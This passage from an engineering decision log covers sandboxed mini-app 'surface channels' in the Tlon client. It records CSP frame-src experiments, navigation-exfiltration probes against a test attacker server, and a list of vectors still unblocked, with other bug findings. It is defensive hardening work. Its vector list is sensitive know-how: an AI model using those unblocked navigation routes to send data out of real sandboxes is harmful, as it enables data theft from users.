  (DraftInputId.none). The none-input maps to the existing
  EmptyNotesRenderer null composer — no new composer surface. The
  renderer dispatches through the existing exhaustive
  BUILTIN_COLLECTION_RENDERERS record.
- **D40: Theme mapping.** The shell knows light/dark only. Host maps the
  tamagui theme name: {dark, dracula, gruvbox} plus a name-contains-
  "dark" heuristic → dark; everything else light. Exotic themes get the
  nearer of the two until shell tokens grow variants.
- **D41: Native hosts are written but UNVERIFIED, and say so.** The RN
  WebView host mirrors the web host through the shared session; every
  device-only behavior carries a greppable `SURFACE-NATIVE-VERIFY`
  marker (transport: inbound delivered by dispatching a window
  MessageEvent via injectJavaScript, because RN postMessage historically
  targets document on iOS vs window on Android; srcdoc/baseUrl: CSP meta
  application under `source={{html}}`; egress:
  `onShouldStartLoadWithRequest` vetoes NAVIGATIONS only — real deny-all
  needs WKContentRuleList / shouldInterceptRequest native modules that
  react-native-webview props cannot express; capabilities: storage/file/
  media props). No native sandbox verification is claimed anywhere.
- **D42: §8 exclusion is a paired predicate.** `isSurfaceChannel` (JS)
  and a `NOT LIKE '%tlon.r0.collection.surface%'` fragment over the JSON
  config text column (SQL) are defined side by side so they can't drift.
  Application: getChats zeroes surface channels' unread rows and
  subtracts the surface contribution from the backend-precomputed group
  counts at read time (floored at zero); getNotifyingUnreadSourceCount
  excludes surface channel/thread rows; SQL-shaped activity queries
  filter via a channels join; relational-API activity queries post-filter
  (their pages can come back shorter than the limit); ChannelListItem
  guards the badge for models from any query. Channel-less events
  (contact, group-level) always pass. Deps arrays gain `channels`
  wherever the exclusion reads channel config. Accepted §8 boundaries,
  recorded not hidden: the group-level `notify` flag stays
  backend-authored (its cause is unknowable client-side), so a group
  whose only notifying child is a surface channel can still light the
  app-badge count; and the LIKE match is substring-based over the config
  JSON — the renderer-id namespace makes false positives implausible,
  but it is a textual, not structural, match. Server-side kind-aware
  activity remains the v1 fix.

### Found, flagged, not fixed (out of scope)

- `activity_event_contact_group_pins`' foreign key targets
  `activity_events(id)`, but that table's real primary key is
  `(id, bucketId)`. Under an enforcing `foreign_keys` pragma (as in the
  shared test db), any statement that makes SQLite resolve that FK —
  `insertActivityEvents`' upsert arm, multi-row inserts — fails with
  "foreign key mismatch". Production connections appear not to enforce
  the pragma, which is why this has never bitten. The §8 tests seed with
  plain per-row inserts to sidestep it; the schema defect itself is
  session-1-through-3-independent and predates this branch.

### Least sure about (flag for review)

- The posture test proves what a browser can observe from inside and
  beside the sandbox; it cannot prove the absence of channels the
  browser doesn't expose. The CSP-meta + opaque-origin design is belt
  and suspenders, not a formal proof.
- Group-count subtraction happens in getChats only; group models reaching
  GroupListItem from other queries would show the backend count. The
  sidebar (the group badge's home) reads getChats, so this is currently
  moot — but a future group-badge surface needs the same subtraction.
- `checkActivityEmpty` now means "no non-surface activity", which is the
  §8-correct reading of "empty" for the activity screen.

## Notes for Session 5+ (tlon-skill, templates, publish gate)

- **Serving fixture bundles:** the host fetches `spec.bundle.assetRef`
  with a plain `fetch()` OUTSIDE the sandbox and hash-verifies through
  `getOrFetchBundle` before anything executes. Any HTTP URL the client
  can reach works — a local static server is fine for development; the
  256 KB size cap is enforced pre-fetch (spec sanity) and the sha256
  post-fetch (authority).
- **What the bot must write for a channel to render as a surface:** the
  channel's content configuration must set collection renderer
  `tlon.r0.collection.surface` AND draft input `tlon.r0.input.none`, and
  the description payload must carry the `surfaceSpec` subtree. The
  renderer keys §6 states off `surfaceSpec` (readSurfaceSpec at every
  read) and §8 exclusion off the content configuration — set both.
- **Invoke expectations for `surface event` tooling:** client invokes
  arrive as one-entry `mode: 'invoke'` blobs under kind tail
  `surface/event` with fallback Story text; `specRevision` is stamped by
  the posting client from the spec it rendered. Stale-revision invokes
  are the bot's to resolve per the ratified reducer rules (§4.3) —
  clients already drop stale invokes that never left the sandbox, but a
  revision can flip mid-flight.
- **Web demonstration path:** `pnpm build:surface-shell` at root, then
  `pnpm e2e:sandbox` in apps/tlon-web (no ships) runs the hostile-bundle
  posture test AND the poll fixture end-to-end through the real host
  document (render → state re-render → tap → invoke → permission-off
  disables). Extend that spec when templates need browser-level checks.
- **Native work is a device checklist, not a code task:** grep
  `SURFACE-NATIVE-VERIFY` for the four marker sites; none can be cleared
  from a laptop. The egress marker in particular needs a native-module
  decision (WKContentRuleList / shouldInterceptRequest) before any
  native ship.
- **Cosmos fixtures** exist for every §6 state
  (`packages/app/fixtures/SurfaceChannel.fixture.tsx`) and render the
  real state components; the ready-state fixture documents the shared
  rendered-state scenarios in comments.

## Session 4.5 decisions (fix batch + the frame-src experiment)

- **D43: The `frame-src` experiment (F1 option D) — hypothesis HOLDS.** A
  `frame-src` allowlist on the **host page** blocks the sandboxed iframe's
  self-initiated navigation **pre-flight** on all three engines. Measured,
  not assumed (`apps/tlon-web/sandbox-posture/navigation.spec.ts`;
  `SANDBOX_ENGINES=all`, 111 tests).

  | host-page config                          | chromium    | firefox     | webkit      | srcdoc loads? |
  | ----------------------------------------- | ----------- | ----------- | ----------- | ------------- |
  | A — no CSP (production today)             | NOT blocked | NOT blocked | NOT blocked | yes           |
  | header `frame-src 'none'`                 | pre-flight  | pre-flight  | pre-flight  | **yes**       |
  | header `frame-src 'self'`                 | pre-flight  | pre-flight  | pre-flight  | yes           |
  | header `frame-src https://example.com`    | pre-flight  | pre-flight  | pre-flight  | yes           |
  | header `frame-src <attacker>` _(control)_ | NOT blocked | NOT blocked | NOT blocked | yes           |
  | meta `frame-src 'none'`                   | pre-flight  | pre-flight  | pre-flight  | yes           |
  | meta `frame-src <attacker>` _(control)_   | NOT blocked | NOT blocked | NOT blocked | yes           |

  Cells are identical across all four probes (`location.replace`,
  `location.href =`, anchor click, `document.write` meta-refresh); that
  uniformity is itself asserted, so a future per-vector divergence fails
  the suite.

  - **Q2 (the one that decides usability): `about:srcdoc` frames still
    load and run under `frame-src 'none'` on all three engines** — srcdoc
    is not a network fetch, so it is exempt from `frame-src`. The
    restriction costs us nothing.
  - **Q3: pre-flight.** Ground truth is the attacker's own HTTP server
    logging zero connections — not merely an absent Playwright event.
    Nothing left the device, so the URL-borne payload never escaped.
    Late/commit-stage blocking would have been useless here, since the
    URL _is_ the exfiltration.
  - **Q4:** `'none'`, `'self'`, and an allowlist excluding the attacker
    behave identically; allowlisting the attacker lets it through on the
    same delivery mechanism, which is what attributes the blocking to
    `frame-src` source matching rather than to the page merely carrying
    a CSP.

  **Methodology, deliberately stronger than the original posture spec**
  (and the standard for future leak tests): a real attacker HTTP server
  replaces the `.invalid` host, because an unresolvable host cannot
  distinguish "CSP blocked it" from "DNS failed"; every probe posts
  `probe-armed` before navigating, so a frame that never loaded cannot be
  mis-scored as blocked; and every blocking config is paired with an
  allowlist-the-attacker control.

  **Engine divergence, recorded and asserted:** after a blocked
  navigation Chromium commits an error page _into the sandbox frame_,
  destroying the running app; firefox and webkit leave it on
  `about:srcdoc` and the app keeps running. Neither leaks — on Chromium a
  hostile bundle can only DoS itself.

  **Known-untested residual:** redirect chains from an allowlisted origin
  to an attacker origin. Any non-empty allowlist reintroduces a hop, so
  this must be measured before anyone calls the hole closed. Also
  untested: `data:`/`blob:` navigation targets. (`window.open` and
  top-level navigation are already blocked by the withheld
  `allow-popups` / `allow-top-navigation` tokens.)

  **Enforcement flip criteria** — the enforcing `frame-src` may be turned
  on only when all of: (1) the allowlist demonstrably covers every
  legitimate frame in the app, verified against Report-Only violation
  reports from real usage, not just static enumeration; (2) the redirect
  residual above has been measured; (3) a rollback path exists that does
  not require a full client release. Until then the enforcing policy
  ships written-but-disabled.

  This upgrades the web posture from "gate is the only boundary against
  navigation egress" to "gate plus origin-restricted navigation," but does
  **not** retire the Worker-realm migration: `frame-src` restricts where a
  frame may navigate, not whether unpinned code can run in it, and it
  depends on a host-page policy that a future deployment change could drop
  silently. M4 stands as recorded in D36 and the amended plan §5.

### Found, flagged, not fixed (session 4.5)

- **`setChannelVolumeLevel` rolls back only when a previous setting
  existed.** `packages/shared/src/store/activityActions.ts` (~line 351):
  the catch restores `existingVolumeSetting` guarded by
  `if (existingVolumeSetting)`. For a channel with no prior setting — a
  freshly discovered one, or any channel a user mutes for the first time
  — a failed poke leaves the optimistic `hush` row in the local DB while
  the ship still says default-notify: the UI shows "muted" and pushes
  keep arriving. `muteThread`/`unmuteThread` in the same file handle this
  correctly via `db.clearVolumeSetting(...)`, so the fix is a small
  `else` branch with in-file precedent.

  Pre-existing and shared with the UI mute button, so **not** fixed here:
  it changes shipped mute behavior and is orthogonal to surface channels.
  F4 does not depend on that local row being correct — the actual
  suppression is the ship-side volume map, and F4's marker correctly
  stays unset on a failed poke so the next discovery retries.

- **D44: Host-page CSP — Report-Only has no production delivery.
  (Supersedes D43's flip criteria.)** A STOP finding, reported rather than
  worked around.

  `tlon-web` ships as a **glob served by `%docket`**, whose
  `+payload-from-glob` returns `index.html` with exactly one header
  (`content-type`); the runtime-cache path hardcodes the same. `%docket`
  is **not in this repo** — `peru.yaml` vendors only docket's
  `lib`/`mar`/`sur`, never `app/docket.hoon` — so no repo-local change can
  add a response header. And CSP3 §3.3 excludes
  `Content-Security-Policy-Report-Only` from `<meta>` delivery (along with
  `report-uri` and `frame-ancestors`).

  Therefore: **the enforcing `<meta>` is the only production mechanism
  that exists.** It is written and gated off behind `ENFORCE_HOST_CSP`
  (a one-line flip, proven through the real build path), and deliberately
  NOT shipped this session. Report-Only runs on the Vite dev and preview
  servers, which is a genuine validation surface — the e2e suite runs
  against `dev-no-ssl` and the production-build smoke path against
  `vite preview`.

  **The allowlist is `frame-src 'self' https://tlon.network`** — one
  entry, exhaustively enumerated: `ManageAccountScreen`'s iframe (a
  hardcoded constant, no per-environment variation). The mini-app sandbox
  is `srcdoc` and measured exempt; the composer's webview shim renders
  `srcDoc` and never `src`; every `window.open` site opens a top-level
  context, which `frame-src` does not govern and for which the policy must
  NOT be widened.

  **Amended flip criteria** (D43's criterion 1 assumed production
  Report-Only telemetry that cannot exist):
  1. Clean Report-Only runs across the dev/e2e surface — **but note this
     is only evidence if something observes violations. Nothing collects
     them today; a violation listener must be wired before a clean run
     may be cited.** Otherwise "no reports" means "nobody looked."
  2. The D43 redirect residual measured (an allowlisted origin
     redirecting to an attacker origin).
  3. Accept that **production enforcement failures are silent**: with no
     `report-uri` available in `<meta>`, an allowlist gap surfaces as a
     broken feature, not a report. This is the strongest argument for
     gathering evidence before the flip, and it replaces D43's
     "verified against real-usage reports," which is unachievable.
  4. Rollback is a glob redeploy, not a client release — faster than an
     app-store cycle, but not instant. State it accurately when planning.

  **Chromium consequence of flipping** (measured, `navigation.spec.ts`):
  a refused navigation commits an error page _into_ the sandbox frame,
  destroying the running mini-app; firefox and webkit leave it on
  `about:srcdoc`. Nothing leaks either way — a hostile bundle can only
  self-destruct its own surface — but it is a real behavioral consequence
  of enforcement, not a reason against it.

- **D43 AMENDMENT (after the B-layer landed).** D43 recorded that "cells
  are identical across all four probes ... that uniformity is itself
  asserted." **That is no longer true, deliberately.** The B-layer's
  lexical shadowing (D45 below) blocks two of the vectors in-realm, so
  the suite now asserts a per-vector split, and D43's Config A "NOT
  blocked" row holds only for the _unshimmed_ vectors
  (`window.location.replace`, anchor click, meta-refresh). The `frame-src`
  findings themselves — pre-flight blocking on all three engines, srcdoc
  exempt, controls behaving — are unaffected.

- **D45: In-realm `Location` hardening as specified is impossible; what
  shipped is narrower and labeled as such.** Measured on all three
  engines in a real `sandbox="allow-scripts"` srcdoc frame:
  `Object.getOwnPropertyDescriptor(Location.prototype, 'replace'|'assign'
|'href')` is **absent** — every `Location` member is
  `[LegacyUnforgeable]`, living as a non-writable, non-configurable **own**
  property of the instance. `defineProperty` throws, assignment silently
  fails, `delete` returns false, and `window.location` is itself
  non-configurable so the object cannot be swapped. A "freeze the Location
  prototype" patch would have been **dead code that reads like
  protection** — the exact failure mode F1 taught us to avoid.

  What ships: lexical shadowing of the bare `location` identifier inside
  the bundle's own function scope, plus replacing `window.open` (the one
  writable navigation-adjacent global, and already inert because
  `allow-popups` is withheld). Post-mitigation matrix under Config A (no
  host CSP — the production posture, since D44's policy ships gated off),
  identical on all three engines:

  | probe                                | result              |
  | ------------------------------------ | ------------------- |
  | `location.replace` (bare identifier) | blocked by the shim |
  | `location.href =` (bare identifier)  | blocked by the shim |
  | `window.location.replace`            | **NOT blocked**     |
  | anchor click (`target="_self"`)      | **NOT blocked**     |
  | `document.write` meta-refresh        | **NOT blocked**     |

  A `nav-window-location` probe was added specifically so the suite
  asserts this residual rather than implying containment; the two shimmed
  vectors read blocked in _every_ config including the
  allowlist-the-attacker controls, which is what proves the shim rather
  than the policy is responsible.

- **D46: Teardown premise is measured, not assumed.** The host tears the
  iframe down on any post-initial `load`. "Initial" is defined **per DOM
  element** (a ref holding the node whose first load was seen), so an
  intentional revision remount — a different node — cannot be confused
  with self-navigation. This depends on never reassigning `srcDoc`
  in place, which is now measured: assigning `srcdoc` to an
  already-inserted element fires **2** loads on chromium/webkit (1 on
  firefox), indistinguishable from self-navigation, while React's
  set-before-insert fires **1**. Pinned per engine so the premise fails
  the suite rather than rotting silently.

### Follow-ups opened this session (not actioned)

- **Native has no teardown equivalent.** `sandboxSession`'s "second
  `ready` re-inits" path is now effectively unreachable on web (teardown
  fires first) but remains live on native, which got only the
  invoke-binding fix. A WebView teardown is device-verification
  territory — add it to the `SURFACE-NATIVE-VERIFY` checklist.
- **A torn-down surface renders a blank pane.** No §6 state covers "this
  app was shut down"; worth a defined state, though it only triggers on
  hostile navigation, which a gate-approved bundle should never do.
- **No CSP violation listener exists** (see D44 criterion 1) — a clean
  Report-Only run is not evidence until something observes violations.

- **D47: `trackError` custom props silently clobber reserved telemetry
  fields — repo-wide, not surface-specific.** `createDevLogger`'s
  `trackError` builds the PostHog/Sentry payload and spreads
  `...customProps` **last** (`packages/shared/src/debug.ts` ~line 303),
  after `message`, `errorMessage`, `breadcrumbs`, `logLevel`,
  `jsContextId`, and `buildInfo`. Any caller passing one of those keys
  overwrites the event's own field. **27 call sites across
  `packages/api` and `packages/shared` pass such a key.**

  For surface this was live: the shell-error branch passed
  `message: <sandbox-supplied string>`, so **attacker-chosen text became
  the telemetry event's own message**, not merely an attached property.
  F6 fixes the surface call site (the bounded detail now rides under
  `detail`), but the underlying footgun is untouched — the next caller to
  pass `message:` reintroduces it silently, with no type error.

  Follow-up worth filing: either spread `customProps` **first** so
  reserved fields win, or namespace them under a single `props` key.
  Deliberately not changed here — it alters the shape of every existing
  error event and belongs in its own reviewed change, not inside a
  surface-channels fix batch.

- **D48: Mutation M12 survived, and the test was kept anyway.** The
  writer-side "an inherited name is not resolvable as a declared action"
  test does not discriminate _which_ gate rejects it: `ActionIdSchema`'s
  charset (`/^[a-z0-9-]+$/`) plus its forbidden-key refinement already
  make `constructor` the only expressible prototype member and reject it,
  so replacing `getDeclaredAction` with a naive lookup still passes. The
  test asserts the outcome rather than the mechanism, which is the right
  thing to assert at that layer — the bridge schema has **no** such
  refinement, and the session-side equivalent (M2) does discriminate.
  Recorded because a surviving mutation is evidence about what a test
  proves, and silently keeping it would be the failure mode
  `feedback_mutation_testing_limits` warns about.

- **D49: Byte identity survives the real `%groups` round trip — verified
  against Hoon for the first time.** Until now the guarantee had only been
  proven against the TS encode/decode pair. The seed writes nine specs
  through the production description path and compares them byte-for-byte
  against what a raw `%groups` scry returns, with no client-side
  transform in between. **No mutation of any kind.** One spec carries a
  deliberate torture payload: NFD vs NFC of the same grapheme, a ZWJ emoji
  with skin-tone modifier, CJK, RTL, leading/trailing whitespace,
  tabs/CRLF, JSON escape characters, deliberately unsorted keys, varied
  number formats, empty string/object/array, deep nesting. All survived.
  NUL and lone surrogates were excluded on purpose — they are not
  representable in a `@t` cord, so a "failure" there would say nothing
  about the guarantee.

- **D50: A deleted channel's name is burned on that ship (backend
  finding, not ours to fix here).** `store.deleteChannel` pokes only
  `%groups`. `%channels-server`'s `ca-create` opens with
  `?: (~(has by v-channels) n)` → `(slog "create already exists")` → a
  **silent no-op**. So re-creating a previously used name leaves the
  channel half-created: `%channels` holds an entry with the bunt flag
  `~zod/`, `%groups` never lists it — and **the client's tracked poke
  still resolves successfully**, so the client believes it worked.
  Reproduced in isolation. The app only dodges this because
  `createChannel` uses random slugs unless `customSlug` is passed; the
  seed was redesigned around it (reuse channels, clear posts). Worth
  filing upstream — the silent success is the dangerous half.

- **D51: `~` in a JSON Pointer segment must be escaped — an authoring
  trap for the templates session.** A host op with path
  `/entries/~sampel-palnet` was silently skipped: `~` is RFC 6901's escape
  character, so a bare `~s` is an invalid escape. The correct segment is
  `~0sampel-palnet`, which is exactly what `$actor` substitution already
  produces (§7). The reducer behaved correctly — it skipped only the
  offending op — but any hand-authored spec using a ship name as a
  literal pointer segment will hit this. **The authoring skill's
  action-design guidance and the publish gate should both cover it**;
  prefer `$actor` over a literal ship wherever possible.

- **D52: Hostile navigation measured on the shipping host page.** With
  the dev server's Report-Only policy live: the shimmed vectors
  (`location.replace`, `location.href`) do nothing; the unshimmed ones
  (`window.location.replace`, anchor click, meta-refresh) **do navigate**,
  the browser logs `…violates the following report-only CSP directive:
"frame-src 'self' https://tlon.network". The violation has been logged,
but no further action has been taken.`, and the host then tears the
  iframe down. This is exactly D43+D44+D45 composing as recorded — and it
  confirms concretely that under Report-Only the request still leaves the
  device. Only the enforcing flip changes that.

- **Also confirmed:** the `activity_event_contact_group_pins` composite-PK
  foreign-key mismatch recorded in session 4 reproduces here on group
  delete under an enforcing `foreign_keys` pragma. Independent
  confirmation of a pre-existing defect, still not ours to fix.

- **D53: A post's id is a host-stamped `@da`; `sentAt` is not (and the
  naming misleads).** Verified today while scoping a `$now` substitution.

  `%channels-server`'s `%add` arm sets the post id to **`now.bowl`** — the
  _host ship's_ clock at the moment it processes the poke — with a
  collision loop bumping by `~s1/2^16` until free
  (`desk/app/channels-server.hoon:1089`), and `desk/sur/channels.hoon:75`
  types `id-post` as `time`. So the id **is** a timestamp, and it is
  server-authoritative: a member cannot forge it, exactly as they cannot
  forge `post.authorId`. The client already derives it —
  `getReceivedAtFromId` → `udToDate` (`packages/api/src/client/postsApi.ts:1421`).

  **The trap:** the client model's two time fields are the reverse of
  what their names suggest.
  - `receivedAt: getReceivedAtFromId(id)` (`postsApi.ts:1385`) — id-derived,
    host-stamped, **trustworthy**.
  - `sentAt: post.essay.sent` (`postsApi.ts:1384`) — the `sent` field the
    **sender** wrote into the essay, **forgeable**.

  Any future `$now`/`$date` substitution (§12) MUST derive from the id.
  Implementing it against `sentAt` — the obvious-looking field, with the
  right-sounding name, sitting one line away — would let a member
  backdate or postdate their own entries, reintroducing the forgery the
  parameterless-invoke design exists to prevent. Recorded here rather
  than only in the plan because this is a fact about the codebase that
  the next implementer can get wrong in a single keystroke.

  Corrects an earlier claim of mine in conversation that surface apps
  "cannot know when" something happened. The information exists and is
  trustworthy; it is simply not plumbed into reduced state yet, because
  op values are spec literals.

- **D54: `append` cannot be made idempotent inside v0, and the honest
  answer is an app-design pattern, not a mechanism.** Design analysis of
  the duplicate-invoke problem (double-tap, transport retry, same user on
  two devices; hand-crafted duplicate posts are spam, bounded by writer
  perms and the state cap, not a correctness issue).

  **Why it is unfixable in-language:** members supply no values, so two
  duplicate appends produce **byte-identical entries** — nothing
  downstream, render or bot or human, can distinguish a double-tap from
  two legitimate entries from state alone. The backend offers no help:
  `%add` stamps a fresh `now.bowl` id per poke with no `(author, sent)`
  dedup (`desk/app/channels-server.hoon:1086-1093`), so a retry is
  genuinely two posts. And the distinguishing datum is not even reachable
  at fold time — `SurfacePostView`
  (`packages/api/src/client/surface/reducer.ts:39-45`) carries
  `authorId`/`sequenceNum`/`isEdited`/`isDeleted`/`blob` and **no id**.

  **v0 answer (no reducer change):** shell-side invoke debounce as
  standard shell behavior; and the **host-is-the-clock** pattern in the
  authoring skill — the member does an idempotent
  `set /today/$actor …`, the host posts a rollover event
  (`set /history/<date> <copy of /today>` + `del /today`) computing date
  and value from its own fold. Two ops, under caps, fully idempotent,
  dated history, no `append` anywhere. Degrades gracefully: a missed
  rollover just stretches "today". §4.3's guidance was corrected — "key
  appended records by `$actor`" under-states the problem, since keying
  the path by actor does not dedupe _repeated_ appends by that actor.
  In v0, `append` in a member action means "duplicates acceptable."

  **v1 answer: `$period` substitution** (see §12) — bucketed from the
  host-stamped id, both substitution sites, **fixed-offset integer
  arithmetic only; never viewer timezone (divergence) and never IANA
  named zones (tzdata skew across clients)**. Cleanest §6 story of the
  options considered: duplicates become literal no-ops, so deletion and
  edit-retraction of either duplicate is a state no-op and snapshots
  finalize normally.

  **Rejected: reducer-internal debounce bookkeeping.** It convergently
  dedupes within a post set, but "when did this actor last invoke" lives
  outside reduced state, so it is **lost at the snapshot boundary** — a
  duplicate pair straddling the boundary silently folds both, failing
  exactly where it cannot be observed. Fixing that means putting the
  markers in state, which is the `oncePer` design; the reserved-subtree
  variant is therefore strictly better than the bookkeeping one. Also
  rejected: a client-supplied idempotency nonce — a member-supplied wire
  value, and it only addresses transport retries anyway.

- **D55: v0's constraints push generated apps to narrate their own
  mechanism, and the gate cannot catch it.** Found by reading the workout
  fixture's UI on a phone, not by any test.

  The fixture shipped user-facing copy reading _"lifts logged since the
  last rollover"_ and _"Clearing removes only your own scratch entries"_,
  with empty states referring to _"No rollover has happened yet"_. Both
  are accurate. Both expose internal vocabulary no lifter should ever
  meet.

  **The cause is a real constraint, correctly handled and badly worded.**
  `render` must never call `Date` — the sandbox clock belongs to the
  _viewer_ while the archive boundary belongs to the _host_, so a viewer
  in a different timezone reading "today" would be looking at a lie. The
  author chose a technically-true label over a friendly-but-wrong one,
  which is the right instinct and the wrong words. "This session" is both
  true and natural, requires no date, and matches how the domain already
  talks.

  Recommended replacements, as a model for the class:
  _"since the last rollover"_ → _"this session"_; _"your own scratch
  entries"_ → _"your own entries for this session"_; _"Archived sessions
  appear here after the first rollover"_ → _"Your past sessions will
  appear here"_; _"No rollover has happened yet"_ → _"No sessions saved
  yet"_.

  **This is a class, not an instance.** Every v0 constraint that shapes
  behavior — no in-app date, host-driven archiving, no viewer identity,
  parameterless actions — invites a generating model to hit the wall,
  describe it accurately, and ship jargon. Left alone, each generated app
  invents its own internal vocabulary.

  **The publish gate cannot detect this**: the style lint covers
  `font-family`, non-token colors and non-whitelisted style properties —
  nothing about whether copy makes sense to a human. So the control has
  to be `PARADIGM.md` carrying a **vocabulary section** next to the
  technical rules, and the templates modelling the words rather than
  leaving each generation to coin them. An authoring-session deliverable.

- **D56: Open question — a bundle-hash change at an unchanged
  `specRevision` did not reach a running client.** Found while updating
  the workout fixture's copy mid-demo, and not fully diagnosed.

  Sequence: the bundle's bytes changed, the seed republished the spec
  with the new `sha256` (verified by scry: the ship held the new hash),
  and `specRevision` stayed at 1. The running iOS client kept rendering
  the **old** bundle. Bumping to revision 2 fixed it immediately.

  This sits awkwardly against §3, which says **"the current content of
  that cell is authoritative, full stop"** and that `specRevision` is for
  correlating events and snapshots, _not_ a cache key. If a client can
  miss a change to the authoritative cell because a correlation number
  did not move, then either the client is wrong or §3 overstates.

  Both plausible mechanisms are unverified: the client may not have
  re-synced the channel description at all, or it may have re-synced and
  then served the old bundle from the content-addressed cache under the
  spec it already held. **Deliberately not guessed at** — distinguishing
  them needs an actual repro.

  Two follow-ups: (1) determine which, and fix the client if it is the
  client; (2) independently, the **seed must bump the revision whenever
  the bundle bytes change**, which is what `surface publish` is already
  specified to do (§9). The seed silently violated that and it cost a
  demo cycle. A hardcoded bump is in place; deriving the revision from
  the bundle hash would make the class of mistake unavailable.

- **D57: Judgment calls in the Sol round-2 fix pass.** Recorded because
  each was a choice not to do the obvious thing.

  - **No `allowLower` escape hatch on the head watermark.** Making
    `setLatestChannelSequenceNum` an atomic maximum removes the ability to
    lower it. All three callers write a server-reported `newest`, and no
    channel-reset or nuke path uses this setter — `updateChannel` is the
    explicit reset path, and a test documents that. An escape hatch
    "just in case" would have reopened the defect for whoever used it.
  - **No `detailLength` in shell-error telemetry.** Having removed the
    truncated `detail`, the tempting compromise is to keep a length for
    debugging. A message length is still a low-bandwidth
    attacker-controlled channel, so the payload carries only
    host-derived values.
  - **Restructuring beat testing** for the surviving mutation. Deleting
    the marker-authority declaration left all 615 tests passing, silently
    in the never-hush direction. Rather than adding a test to cover the
    gap, the mirror write and the declaration were collapsed into one
    call so the omission is inexpressible. A test would have caught that
    one mutation; the restructure removes the shape of the mistake.

- **D58: Judgment calls in the chart primitive.**

  - **Aspect-ratio box, not a height prop.** A pixel height is exactly
    the dimension being removed — one number an author guesses against an
    unknown viewport, where the guess that looks right on desktop is the
    one that breaks on a phone. Floor and ceiling bound the box
    (`maintainAspectRatio: false` will happily draw into zero height).
  - **Responsive options applied AFTER the caller's**, so a bundle cannot
    opt back into a fixed canvas through the primitive. The broken path
    is unreachable rather than discouraged — the same discipline as the
    reducer taking ops from the spec rather than the message.
  - **Constructor injected, not imported**, so the kit keeps no hard
    `chart.js` dependency, tests can stub it, and a chart-free shell
    renders an empty state instead of throwing.
  - **`surface.Chart` (raw) retained.** Removing it is a breaking change,
    so the escape hatch — and therefore the residual way to write the
    broken version — remains. This is why the gate check must be
    behavioral (§9) rather than relying on the primitive's existence.
  - **Guarded `chart.update()`.** Chart.js's documented clean degradation
    covers construction only; `update()` with no 2D context throws, and
    the effect runs inside `render()`, so an escaping throw would replace
    the whole app with the broken-state view — worse than the old bundles,
    which never called `update`. Falls back to destroy-and-rebuild.
  - **Left alone: theme flips don't recolor a drawn chart.** The harness
    sets `data-theme` without re-rendering, so a canvas keeps its colors
    until the next state update. Pre-existing, and the fix is a harness
    behavior change; not folded into a primitive change.

- **D59: D56 resolved — the mechanism was not the one hypothesised, and
  the ruling still holds.** `insertGroups`' `onConflictDoUpdate` allowlist
  (`packages/shared/src/db/queries.ts`) listed `description` and
  `contentConfiguration` — both **derived** from the description cell —
  while omitting `descriptionPayload` (the verbatim cell) and
  `surfaceSpec`. It is the only write carrying group-channel metadata on
  a boot or full group sync, so once a channel row existed it refreshed
  the readable description and the renderer config while **pinning the
  raw payload and the app definition** to whatever they held when the row
  was created. Two writers of the same table disagreed:
  `insertChannelsInternal` uses `conflictUpdateSetAll` with explicit
  exclusions and was always correct; `insertGroups` hand-listed columns
  and drifted.

  **D56 guessed wrong about the cause.** The bumped-revision case failed
  identically before the fix, so the swallow was never keyed on
  `specRevision` — it dropped the whole cell. What made "bump the
  revision" appear to fix it during the demo was a _different carrier_
  landing the change: the live `r-groups` edit fact spreads the full
  channel into `db.updateChannel`, which does write both columns. With a
  live SSE connection in the foreground it lands; recovering via init or
  group sync it never does. Both candidate mechanisms D56 recorded are
  now settled — the first confirmed and reproducible, the second (a stale
  content-addressed bundle cache) ruled out, since `useSurfaceBundle`
  keys on `sha256` and a new hash is a miss by construction.

  Worth keeping as a lesson: the demo-time "fix" was a **coincidence of
  transport**, and had we accepted it as the explanation we would have
  shipped a bump-the-revision workaround around a bug that drops the cell
  entirely. Diagnosing before fixing was what separated them.

  **The second consequence was worse than the reported one.**
  `channelActions.updateChannel` rebuilds the outgoing description from
  `currentChannel.descriptionPayload`, so a stale payload meant any
  routine metadata edit — a rename, a privacy change — pushed the
  **superseded spec back onto the ship**, reverting a bot's republish on
  the authoritative cell. The reported symptom was a client rendering
  stale; the unreported one was a client silently corrupting shared
  state.

  §3 amended accordingly (on-branch): change detection keys on cell
  content, and every write carrying channel metadata must refresh the
  verbatim payload and the spec, not only the fields derived from them.

## Session 5 decisions (tlon-skill: the `surface` commands, gate, preview, templates)

- **D60: the plan is now committed on-branch, superseding D1.** Session
  5's prompt treats `surface-channels-plan.md` as canonical on the branch
  and directs amendments to be applied there. D1 had kept it untracked
  alongside the handoff prompts; that no longer holds. The plan and the
  code are now reviewed against each other, and amendments have a history
  instead of living only in a working copy. Session prompts, reports and
  the review logs stay untracked as before.

- **D61: the sandbox document assembler lives in `packages/surface-shell`,
  not in `packages/app`.** It moved to `src/sandbox/document.ts`, exported
  as `@tloncorp/surface-shell/sandbox`, and `packages/app` now imports it
  from there. Nothing about the assembly changed — CSP meta, nav guard,
  shell-first ordering, `</script` escaping and the bundle wrapper are
  byte-for-byte what they were, and the browser posture suite (47
  chromium) passes with only its import path edited.

  The reason is the same one that puts the reducer in `@tloncorp/api` and
  the protocol schemas here: `tlon-skill`'s preview and the publish gate's
  smoke render have to run the **identical** function, not an equivalent
  one. A second copy would make "preview equals production" a claim
  maintained by convention, which is the class of guarantee that holds
  right up until someone edits one side. This is host-side code inside the
  package whose boundary is the sandbox — deliberately so; the artifact
  entry does not reach it, and `check:deps` still refuses anything that
  would drag app internals in.

  Its unit tests moved with it (`app` 545 → 539, `surface-shell` 43 → 49);
  they run unchanged under happy-dom.

- **D62: sigil rendering is folded into the avatar primitive, and the core
  is imported rather than injected.**

  - **Vetting.** `@urbit/sigil-js@2.2.0` is MIT (Tlon's own). The `/core`
    entry is a total function from a point name to an SVG string with
    **no** `document`, `window`, `Date`, `performance`, `Math.random`,
    `fetch`, `XMLHttpRequest`, `localStorage` or `navigator` reference
    anywhere in the module — so it satisfies the "`render` never reads the
    clock" rule structurally rather than by inspection, and it runs under
    `default-src 'none'`. Only `invariant` comes along; `lodash.memoize` is
    used by the root export (a custom-element registration) and not by
    `/core`. `check:deps` therefore allows the **exact** specifier
    `@urbit/sigil-js/core` and not the package tree, so the web-component
    and React wrappers stay unreachable from shell source.
  - **Imported, not injected — deliberately unlike the Chart.js
    constructor (D58).** A chart needs a live 2D context and legitimately
    degrades to an empty state without one. A sigil is arithmetic, so
    injection would buy nothing but the possibility of the publish gate's
    happy-dom smoke render drawing an avatar the sandbox does not. That is
    exactly the divergence D61 exists to prevent.
